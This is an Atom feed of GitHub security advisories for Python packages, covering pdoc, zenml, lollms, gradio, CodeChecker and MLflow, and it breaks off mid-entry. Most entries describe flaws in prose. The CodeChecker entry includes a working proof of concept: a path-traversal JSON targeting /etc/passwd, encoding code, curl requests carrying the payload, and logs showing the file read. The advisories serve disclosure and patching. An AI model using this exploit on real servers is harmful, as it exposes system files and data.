<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2024-06-26T11:01:14.494Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[pdoc] pdoc embeds link to malicious CDN if math mode is enabled]]></title>
        <id>https://github.com/advisories/GHSA-5vgj-ggm4-fg62</id>
        <link href="https://github.com/advisories/GHSA-5vgj-ggm4-fg62"/>
        <updated>2024-06-25T22:26:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Documentation generated with <code>pdoc --math</code> linked to JavaScript files from polyfill.io.
The polyfill.io CDN has been sold and now serves malicious code.</p>
<p>Users who produce documentation with math mode should update immediately. All other users are unaffected.</p>
<h3 id="patches">Patches</h3>
<p>This issue has been fixed in pdoc 14.5.1.</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/mitmproxy/pdoc/pull/703">https://github.com/mitmproxy/pdoc/pull/703</a>
<a href="https://sansec.io/research/polyfill-supply-chain-attack">https://sansec.io/research/polyfill-supply-chain-attack</a></p>
<h3 id="timeline">Timeline</h3>
<ul>
<li><strong>[2024-06-25]</strong> <a href="https://sansec.io/research/polyfill-supply-chain-attack">https://sansec.io/research/polyfill-supply-chain-attack</a> is published.</li>
<li><strong>[2024-06-25 20:54 UTC]</strong> Issue reported to the pdoc project by @adhintz.</li>
<li><strong>[2024-06-25 21:33 UTC]</strong> Patched version released.</li>
<li><strong>[2024-06-25 21:37 UTC]</strong> Security advisory published.</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/mitmproxy/pdoc/security/advisories/GHSA-5vgj-ggm4-fg62">https://github.com/mitmproxy/pdoc/security/advisories/GHSA-5vgj-ggm4-fg62</a></li>
<li><a href="https://github.com/mitmproxy/pdoc/pull/703">https://github.com/mitmproxy/pdoc/pull/703</a></li>
<li><a href="https://sansec.io/research/polyfill-supply-chain-attack">https://sansec.io/research/polyfill-supply-chain-attack</a></li>
<li><a href="https://github.com/mitmproxy/pdoc/commit/726b8f2e365fe8afeb3604a7c73d19b460395d58">https://github.com/mitmproxy/pdoc/commit/726b8f2e365fe8afeb3604a7c73d19b460395d58</a></li>
<li><a href="https://github.com/advisories/GHSA-5vgj-ggm4-fg62">https://github.com/advisories/GHSA-5vgj-ggm4-fg62</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5vgj-ggm4-fg62</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-25T22:23:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[zenml] Improper line feed handling in zenml]]></title>
        <id>https://github.com/advisories/GHSA-7gjr-hcc3-xfr4</id>
        <link href="https://github.com/advisories/GHSA-7gjr-hcc3-xfr4"/>
        <updated>2024-06-24T21:28:27.000Z</updated>
        <content type="html"><![CDATA[<p>A denial of service (DoS) vulnerability exists in zenml-io/zenml version 0.56.3 due to improper handling of line feed (<code>\n</code>) characters in component names. When a low-privileged user adds a component through the API endpoint <code>api/v1/workspaces/default/components</code> with a name containing a <code>\n</code> character, it leads to uncontrolled resource consumption. This vulnerability results in the inability of users to add new components in certain categories (e.g., 'Image Builder') and to register new stacks through the UI, thereby degrading the user experience and potentially rendering the ZenML Dashboard unusable. The issue does not affect component addition through the Web UI, as <code>\n</code> characters are properly escaped in that context. The vulnerability was tested on ZenML running in Docker, and it was observed in both Firefox and Chrome browsers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-4460">https://nvd.nist.gov/vuln/detail/CVE-2024-4460</a></li>
<li><a href="https://github.com/zenml-io/zenml/commit/164cc09032060bbfc17e9dbd62c13efd5ff5771b">https://github.com/zenml-io/zenml/commit/164cc09032060bbfc17e9dbd62c13efd5ff5771b</a></li>
<li><a href="https://huntr.com/bounties/a387c935-b970-44d7-bddc-71c1c90aa2de">https://huntr.com/bounties/a387c935-b970-44d7-bddc-71c1c90aa2de</a></li>
<li><a href="https://github.com/advisories/GHSA-7gjr-hcc3-xfr4">https://github.com/advisories/GHSA-7gjr-hcc3-xfr4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7gjr-hcc3-xfr4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-24T09:30:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lollms] Remote Code Execution in create_conda_env function in lollms]]></title>
        <id>https://github.com/advisories/GHSA-79h8-gxhq-q3jg</id>
        <link href="https://github.com/advisories/GHSA-79h8-gxhq-q3jg"/>
        <updated>2024-06-24T21:25:40.000Z</updated>
        <content type="html"><![CDATA[<p>A remote code execution vulnerability exists in the create_conda_env function of the parisneo/lollms repository. The vulnerability arises from the use of shell=True in the subprocess.Popen function, which allows an attacker to inject arbitrary commands by manipulating the env_name and python_version parameters. This issue could lead to a serious security breach as demonstrated by the ability to execute the 'whoami' command among potentially other harmful commands.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-3121">https://nvd.nist.gov/vuln/detail/CVE-2024-3121</a></li>
<li><a href="https://huntr.com/bounties/db57c343-9b80-4c1c-9ab0-9eef92c9b27b">https://huntr.com/bounties/db57c343-9b80-4c1c-9ab0-9eef92c9b27b</a></li>
<li><a href="https://github.com/advisories/GHSA-79h8-gxhq-q3jg">https://github.com/advisories/GHSA-79h8-gxhq-q3jg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-79h8-gxhq-q3jg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-24T00:34:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lollms] Remote Code Execution via path traversal bypass in lollms]]></title>
        <id>https://github.com/advisories/GHSA-mvrm-fh8q-6wr2</id>
        <link href="https://github.com/advisories/GHSA-mvrm-fh8q-6wr2"/>
        <updated>2024-06-24T21:22:51.000Z</updated>
        <content type="html"><![CDATA[<p>CVE-2024-4320 describes a vulnerability in the parisneo/lollms software, specifically within the <code>ExtensionBuilder().build_extension()</code> function. The vulnerability arises from the <code>/mount_extension</code> endpoint, where a path traversal issue allows attackers to navigate beyond the intended directory structure. This is facilitated by the <code>data.category</code> and <code>data.folder</code> parameters accepting empty strings (<code>""</code>), which, due to inadequate input sanitization, can lead to the construction of a <code>package_path</code> that points to the root directory. Consequently, if an attacker can create a <code>config.yaml</code> file in a controllable path, this path can be appended to the <code>extensions</code> list and trigger the execution of <code>__init__.py</code> in the current directory, leading to remote code execution. The vulnerability affects versions from 5.9.0, and has been addressed in version 9.5.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-5443">https://nvd.nist.gov/vuln/detail/CVE-2024-5443</a></li>
<li><a href="https://github.com/parisneo/lollms/commit/2d0c4e76be93195836ecd0948027e791b8a2626f">https://github.com/parisneo/lollms/commit/2d0c4e76be93195836ecd0948027e791b8a2626f</a></li>
<li><a href="https://huntr.com/bounties/db52848a-4dbe-4110-a981-03739834bf45">https://huntr.com/bounties/db52848a-4dbe-4110-a981-03739834bf45</a></li>
<li><a href="https://github.com/advisories/GHSA-mvrm-fh8q-6wr2">https://github.com/advisories/GHSA-mvrm-fh8q-6wr2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mvrm-fh8q-6wr2</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-06-22T18:30:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gradio] Open redirect in gradio]]></title>
        <id>https://github.com/advisories/GHSA-g6c9-f4xm-9j4x</id>
        <link href="https://github.com/advisories/GHSA-g6c9-f4xm-9j4x"/>
        <updated>2024-06-24T21:14:33.000Z</updated>
        <content type="html"><![CDATA[<p>An open redirect vulnerability exists in the gradio-app/gradio, affecting the latest version. The vulnerability allows an attacker to redirect users to arbitrary websites, which can be exploited for phishing attacks, Cross-site Scripting (XSS), Server-Side Request Forgery (SSRF), amongst others. This issue is due to improper validation of user-supplied input in the handling of URLs. Attackers can exploit this vulnerability by crafting a malicious URL that, when processed by the application, redirects the user to an attacker-controlled web page.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-4940">https://nvd.nist.gov/vuln/detail/CVE-2024-4940</a></li>
<li><a href="https://huntr.com/bounties/35aaea93-6895-4f03-9c1b-cd992665aa60">https://huntr.com/bounties/35aaea93-6895-4f03-9c1b-cd992665aa60</a></li>
<li><a href="https://github.com/advisories/GHSA-g6c9-f4xm-9j4x">https://github.com/advisories/GHSA-g6c9-f4xm-9j4x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g6c9-f4xm-9j4x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-22T06:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[codechecker] CodeChecker has a Path traversal in `CodeChecker server` in the endpoint of `CodeChecker store`]]></title>
        <id>https://github.com/advisories/GHSA-h26w-r4m5-8rrf</id>
        <link href="https://github.com/advisories/GHSA-h26w-r4m5-8rrf"/>
        <updated>2024-06-24T21:28:00.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>ZIP files uploaded to the server-side endpoint handling a <code>CodeChecker store</code> are not properly sanitized. An attacker can exercise a path traversal to make the <code>CodeChecker server</code> load and display files from an arbitrary location on the server machine.</p>
<h2 id="details">Details</h2>
<h3>Target</h3>
<p>The vulnerable endpoint is <code>/&lt;PRODUCT_URL&gt;/v6.53/CodeCheckerService@massStoreRun</code>.</p>
<h3 id="exploit-overview">Exploit overview</h3>
<p>The attack is made possible by improper sanitization at one point in the process.</p>
<ol>
<li>When the ZIP file is uploaded by <code>CodeChecker store</code>, it is first unzipped to a temporary directory (safely).</li>
<li>When deciding which files to insert into CodeChecker's internal database, the decision is made based on the <code>content_hashes.json</code> in the ZIP. An attacker has control over the contents of this file.</li>
<li>After reading that file, the paths specified in the JSON are normalized by this code:
<a href="https://github.com/Ericsson/codechecker/blob/fa41e4e5d9566b5a4f5a80a27bddec73a5146f5a/web/server/codechecker_server/api/mass_store_run.py#L442-L444">https://github.com/Ericsson/codechecker/blob/fa41e4e5d9566b5a4f5a80a27bddec73a5146f5a/web/server/codechecker_server/api/mass_store_run.py#L442-L444</a></li>
<li>Providing sufficiently many <code>../../</code>s inside the <code>content_hashes.json</code>, an attacker can control the insertion of completely arbitrary files into CodeChecker's internal database.</li>
<li>This is confirmed in the log output:</li>
</ol>
<pre><code>mass_store_run.py:444 __store_source_files() - Storing source file: /etc/passwd
</code></pre>
<ol start="6">
<li>Once the file is inserted into the internal database, it can be displayed trivially on the Web interface.
As CodeChecker doesn't distinguish between filenames after the ZIP is extraced, an attacker can define aliases in <code>content_hashes.json</code>.</li>
</ol>
<pre><code>mass_store_run.py:444 __store_source_files() - Storing source file: /home/discookie/.codechecker/tmpx7hg1teb/root/etc/passwd
mass_store_run.py:453 __store_source_files() - /etc/passwd not found or already stored.
</code></pre>
<ol start="7">
<li>The file is displayed in the Web UI if and only if there is at least one <em>bug report</em> in it.
The bug reports are coming from the ZIP and the attacker can craft the required contents for this.
If done so, the logs confirm the requirement for presenting the results of the exploit will be triggered:</li>
</ol>
<pre><code>hash.py:208 get_report_path_hash() - 2|12|Path traversal|/etc/passwdcore.DivideZero3d3a7db6520247eaf90719a53d7103e2
</code></pre>
<ol start="8">
<li>The server emits the contents of the injected files from the server's database to all users:
<img alt="CodeChecker's Web UI showing the snapshot of the /etc/passwd file that was injected to the database due to the path traversal attack." src="https://user-images.githubusercontent.com/16914176/278057281-2c6994ed-4c24-4026-a6b6-148ac43243ca.png"></li>
</ol>
<blockquote>
<p>[!NOTE]<br>The file is shown with the contents as it was on the system when the exploited <code>CodeChecker store</code> was exercised. This attack does not allow the server to return the "live" contents of a file on the server's storage — the attacker(s) must recurringly exercise the exploit to keep the injected files "updated" in the database.</p>
</blockquote>
<h2 id="poc">PoC</h2>
<p>The minimal example that can trigger the exploit can be downloaded: <a href="https://github.com/Ericsson/codechecker/files/14757143/PoC.zip"><code>PoC.zip</code></a>.</p>
<p>The key to the exploit is the <code>content_hashes.json</code> file. The additional files create a report in the loaded <code>/etc/passwd</code> file, so it is displayed in the web UI.</p>
<details><summary><tt>/content_hashes.json</tt></summary>

<pre><code class="language-json">{"/../../../../../../../../../../../../../../../etc/passwd": "malformed_hash", "/etc/passwd": "malformed_hash"}
</code></pre>
</details>

<h4 id="uploading-the-zip-to-the-server">Uploading the ZIP to the server</h4>
<p>The communication between the <code>CodeChecker store</code> and the server is done by transmitting the ZIP file in a Base64-encoded string.<br>Encoding the ZIP into the format of the API can be done with Python:</p>
<pre><code class="language-py">import base64
import zlib

with open("PoC.zip", "rb") as f:
    contents = f.read()
encoded = base64.b64encode(zlib.compress(contents))
print(encoded)
</code></pre>
<p>The result of the compression and encoding can be sent to the running server over the API.
When the API is called, the exploit is exercised.</p>
<pre><code class="language-bash">curl "&lt;SERVER_URL&gt;/&lt;PRODUCT_URL&gt;/v6.53/CodeCheckerService" \
    --data \
    '[1,"massStoreRun",1,0,{"1":{"str":"poc"},"3":{"str":"6.22.1"},"4":{"str":"&lt;ENCODED_ZIP&gt;"},"5":{"tf":0}}]'
</code></pre>
<details><summary>One-line PoC</summary>

<pre><code class="language-bash">curl "http://localhost:8001/Default/v6.53/CodeCheckerService" \
    --data \
    '[1,"massStoreRun",1,0,{"1":{"str":"poc"},"3":{"str":"6.22.1"},"4" {"str":"eJzNVk9vIzUUT3cpS4MqIcEB2Msw6oGV2vmXzKRZZVPYdpGqLSXSdrXqVquRM+NJhk7GI9tpN5Qe0SJx4MARCfEB+AaIE2glrnAAwY0DXwAQ4gT2ZCbj+ZNI2ROTWLaff+/5+edn+/XuXn2uXuOfi48frP7zh49Ym5eXWXFQSGFI7SEgQ0iU9wkKL2RVUZb4Q+qoESDk3JVvSvIIBB7CI+jGJuVNSV4MuOwx/16J/fvQP35QE74XWMEwQpgSNUMhnEfdEFCg5WoeMFxLc7Vtz2u0XVNvt0yrrbcA8JqN2MyUjK+YGeutk78fXqnVeLGWMTOCFLiAgilf63WJffIZxMRHIVujsZmIKEIBYYKTaZ9/F1kzhoRgBDktDnKhM4TOKcTyZgEDHMoM2+F4xJCN4qiDRiMQcm5PHhXHMp9kSzEMRZfe3Aag3296Ld2Ebrule6bnsbXp/WZjGxrA0TRNt6DeNG+U3DhH+NQPB7brY+hQhCfcrFqCoTGNxtSOAB1WAzAk44DaBI2xA23PDyDnqEBMjCRgFAVQiQKf0NiWEEp5+GWJsxAEkw/Y8rnp0ig59aMIcs604hD1R5BQNvE8p/pw4HNGdau9bTTaTaOpaJap66axWYGG8c4IWNPSrEazWXA/6ybNR+v1yyxa77Fo/WtlfPuja7UaL+Yy0Sqy2Nl5PAqkJCxuybqiyRIMWfCxjb0l3z96Z2tb3unWO2/svbd7dNy7I8VaUu/+7YP9XUneUtW3I2ZMVfeO9qTewf69I4nZUNU7h7IkDymNbqrq+fm5AjhKYaHJgez4YhRBTCcHzNgWU1Bc6spsmqn1nDtM6voO7dbXOqdw0nV9MAgRob5DOioXMDnAGPDGWopcm2IdQOGAxWUKZGJCMVtZ9wANfEeCGCPcURNZpsaPnc0PYlnRQRgqe/6Z78KHEKOysguJg/2IH9Cydo+dAYliwBcIgrKyT8gYxvegnV7EyLMDP4S2H05Fj2nZbMNtsE3vW6ahGc0WBF5ba+ltYDbclq41oFGeKECMm7yLM+oSElCQDa51fDb1AOKuzoyl7QzMz2wVWqsC8+VUgQuWO2p+M/n9Ibg72/Oc6+keRCJ2gUNTPLvF3Bw8oQuesR3IkTeXvrwXVRQuIrGaxkV+V1I5n8wcnYkyu9YIGMCqhS+I00QZg3AASU5X2JFiL0/OHHpEgsrrnUfRQpLm0bSIqAJVy/ve/P/43lHFbcj1xOOVyWfSTDZzveq+TQJDeIeFYCnYSJOkmZnUgXg0fZ9nay3c5XOu44DFIQFihGYLi/UGMISYvQOu3Z8sZ3uXZWC70wysfIEmT1RZa5pWVTqUNrI6fu669d7dlSs7tXlJ+UaS2EpJXZGi15PBldqrtU++6LQOr/2ycvr0z095/evn13/cY/V0knmZdTrJS6x8KSQTouWfn7weW/qe/Pvtu6xO+6LlcjYuWn66TJoiTj0xvV2+mB9+I8eHpannZfAic+srz5rPi358Ix98zOdP69c2rpf8KOdmoh9fX33GTE104+LJ7xt8+rT+7qeUjtXnOWaV/fYZBZ+9yHv/Ac5gmHc="},"5":{"tf":0}}]' 
</code></pre>
</details>

<details><summary>Full server logs for the <tt>store</tt> processing</summary>

<pre><code>[INFO][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - server.py:342 do_POST() - 127.0.0.1:33352 -- [Anonymous] POST /Default/v6.53/CodeCheckerService@massStoreRun
[INFO][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:61 __enter__() - [poc] Unzip storage file...
[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:82 unzip() - Unzipping mass storage ZIP '/tmp/tmpenegwbxj.zip' to '/home/discookie/.codechecker/tmpx7hg1teb'...
[INFO][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:64 __exit__() - [poc] Unzip storage file done... (duration: 0.0 sec)
[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:1298 store() - Using unzipped folder '/home/discookie/.codechecker/tmpx7hg1teb'
[INFO][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:61 __enter__() - [poc] Store source files...
[INFO][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:1310 store() - [poc] Storing 2 source file(s).
[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:444 __store_source_files() - Storing source file: /etc/passwd
[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:444 __store_source_files() - Storing source file: /home/discookie/.codechecker/tmpx7hg1teb/root/etc/passwd
[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:453 __store_source_files() - /etc/passwd not found or already stored.
[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:463 __store_source_files() - 17 fileid found
[INFO][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:64 __exit__() - [poc] Store source files done... (duration: 0.01 sec)
[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:1363 store() - Storing into run 'poc' locked at '2023-10-25 14:30:31.615536'.
[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:686 __add_or_update_run() - Adding run 'poc'...
[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:730 __add_or_update_run() - Adding run history.
[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:755 __add_or_update_run() - Adding run done.
[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:761 __add_or_update_run() - Storing analysis statistics done.
[INFO][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:61 __enter__() - [poc] Store reports...
[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:1163 __store_reports() - Get reports from '/home/discookie/.codechecker/tmpx7hg1teb/reports' directory
[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:1163 __store_reports() - Get reports from '/home/discookie/.codechecker/tmpx7hg1teb/reports/a7d0fa2d60d08ff39d519756917aaf43' directory
[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:1175 __store_reports() - Parsing input file 'sample.plist'
[DEBUG][2023-10-25 14:30:31] {report-converter} [2043] &lt;139754026274816&gt; - hash.py:208 get_report_path_hash() - 2|12|Path traversal|/etc/passwdcore.DivideZero3d3a7db6520247eaf90719a53d7103e2
[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:987 __process_report_file() - Storing report to the database...
[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:827 __add_report_context() - Storing bug path positions.
[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:834 __add_report_context() - Storing bug path events.
[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:842 __add_report_context() - Storing notes.
[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:853 __add_report_context() - Storing macro expansions.
[INFO][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:1220 __store_reports() - [poc] Processed 1 analyzer result file(s).
[INFO][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:64 __exit__() - [poc] Store reports done... (duration: 0.1 sec)
[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:1260 finish_checker_run() - Finishing checker run
[INFO][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:1397 store() - 'Anonymous' stored results (3 KB /decompressed/) to run 'poc' (id: 16)  in 0.15 seconds.
[INFO][2023-10-25 14:30:31] {store_time} [2043] &lt;139754026274816&gt; - mass_store_run.py:1414 store() - 2023-10-25T14:30:31.612326, 0.15s, "Default", "poc", 3KB, 1, 16
[DEBUG][2023-10-25 14:30:31] {profiler} [2043] &lt;139754026274816&gt; - profiler.py:59 debug_wrapper() - [0.173351s] massStoreRun
</code></pre>
</details>

<h2 id="impact">Impact</h2>
<p>The path traversal vulnerability allows reading data on the machine of the <code>CodeChecker server</code>, with the same permission level as the <code>CodeChecker server</code> process. This allows for the exfiltration from the server-side storage medium.
If the <code>CodeChecker server</code> is run with authentication enabled (not the default configuration), then the attack requires a valid user account on the <code>CodeChecker server</code>, with the permission to store to a database, and view the stored reports.</p>
<p>CVSS 3.1 Base Score: 6.5
<a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N&amp;version=3.1">AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</a></p>
<p>Reproducible up to version <code>6.22.1</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Ericsson/codechecker/security/advisories/GHSA-h26w-r4m5-8rrf">https://github.com/Ericsson/codechecker/security/advisories/GHSA-h26w-r4m5-8rrf</a></li>
<li><a href="https://github.com/Ericsson/codechecker/commit/46bada41e32f3ba0f6011d5c556b579f6dddf07a">https://github.com/Ericsson/codechecker/commit/46bada41e32f3ba0f6011d5c556b579f6dddf07a</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-49793">https://nvd.nist.gov/vuln/detail/CVE-2023-49793</a></li>
<li><a href="https://github.com/advisories/GHSA-h26w-r4m5-8rrf">https://github.com/advisories/GHSA-h26w-r4m5-8rrf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h26w-r4m5-8rrf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-24T16:18:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLFlow unsafe deserialization]]></title>
        <id>https://github.com/advisories/GHSA-j8mg-pqc5-x9gj</id>
        <link href="https://github.com/advisories/GHSA-j8mg-pqc5-x9gj"/>
        <updated>2024-06-21T14:37:20.000Z</updated>
        <content type="html"><![CDATA[<p>Deserialization of untrusted data can occur in versions of the MLflow platform running version 2.0.0rc0 or newer, enabling a maliciously uploaded Tensorflow model to run arbitrary code on an end user’s system when interacted with.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37057">https://nvd.nist.gov/vuln/detail/CVE-2024-37057</a></li>
<li><a href="https://hiddenlayer.com/sai-security-advisory/mlflow-june2024">https://hiddenlayer.com/sai-security-advisory/mlflow-june2024</a></li>
<li><a href="https://github.com/advisories/GHSA-j8mg-pqc5-x9gj">https://github.com/advisories/GHSA-j8mg-pqc5-x9gj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j8mg-pqc5-x9gj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T12:31:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLFlow unsafe deserialization]]></title>
        <id>https://github.com/advisories/GHSA-x38x-g6gr-jqff</id>
        <link href="https://github.com/advisories/GHSA-x38x-g6gr-jqff"/>
        <updated>2024-06-21T14:36:58.000Z</updated>
        <content type="html"><![CDATA[<p>Deserialization of untrusted data can occur in versions of the MLflow platform running version 1.24.0 or newer, enabling a maliciously uploaded pmdarima model to run arbitrary code on an end user’s system when interacted with.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37055">https://nvd.nist.gov/vuln/detail/CVE-2024-37055</a></li>
<li><a href="https://hiddenlayer.com/sai-security-advisory/mlflow-june2024">https://hiddenlayer.com/sai-security-advisory/mlflow-june2024</a></li>
<li><a href="https://github.com/advisories/GHSA-x38x-g6gr-jqff">https://github.com/advisories/GHSA-x38x-g6gr-jqff</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x38x-g6gr-jqff</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T12:31:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLFlow unsafe deserialization]]></title>
        <id>https://github.com/advisories/GHSA-cwgg-w6mp-w9hg</id>
        <link href="https://github.com/advisories/GHSA-cwgg-w6mp-w9hg"/>
        <updated>2024-06-21T14:36:38.000Z</updated>
        <content type="html"><![CDATA[<p>Deserialization of untrusted data can occur in versions of the MLflow platform running version 2.5.0 or newer, enabling a maliciously uploaded Langchain AgentExecutor model to run arbitrary code on an end user’s system when interacted with.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37058">https://nvd.nist.gov/vuln/detail/CVE-2024-37058</a></li>
<li><a href="https://hiddenlayer.com/sai-security-advisory/mlflow-june2024">https://hiddenlayer.com/sai-security-advisory/mlflow-june2024</a></li>
<li><a href="https://github.com/advisories/GHSA-cwgg-w6mp-w9hg">https://github.com/advisories/GHSA-cwgg-w6mp-w9hg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cwgg-w6mp-w9hg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T12:31:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLFlow unsafe deserialization]]></title>
        <id>https://github.com/advisories/GHSA-7p8j-qv6x-f4g4</id>
        <link href="https://github.com/advisories/GHSA-7p8j-qv6x-f4g4"/>
        <updated>2024-06-21T14:35:06.000Z</updated>
        <content type="html"><![CDATA[<p>Deserialization of untrusted data can occur in versions of the MLflow platform running version 1.23.0 or newer, enabling a maliciously uploaded LightGBM scikit-learn model to run arbitrary code on an end user’s system when interacted with.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37056">https://nvd.nist.gov/vuln/detail/CVE-2024-37056</a></li>
<li><a href="https://hiddenlayer.com/sai-security-advisory/mlflow-june2024">https://hiddenlayer.com/sai-security-advisory/mlflow-june2024</a></li>
<li><a href="https://github.com/advisories/GHSA-7p8j-qv6x-f4g4">https://github.com/advisories/GHSA-7p8j-qv6x-f4g4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7p8j-qv6x-f4g4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T12:31:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLFlow unsafe deserialization]]></title>
        <id>https://github.com/advisories/GHSA-43c4-9qgj-x742</id>
        <link href="https://github.com/advisories/GHSA-43c4-9qgj-x742"/>
        <updated>2024-06-21T14:34:45.000Z</updated>
